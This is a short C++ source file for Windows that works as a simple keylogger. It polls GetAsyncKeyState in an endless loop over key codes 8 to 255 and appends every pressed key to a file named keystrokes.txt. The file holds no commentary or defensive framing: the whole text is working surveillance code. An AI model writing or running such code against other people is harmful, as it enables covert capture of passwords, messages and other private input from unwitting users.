#include <windows.h>
#include <fstream>
#include <iostream>
using namespace std;

int main() {
    ofstream logFile("keystrokes.txt", ios::app);

    while (true) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {
                logFile << char(key);
                logFile.flush();
            }
        }
        Sleep(10);
    }

    logFile.close();
    return 0;
}
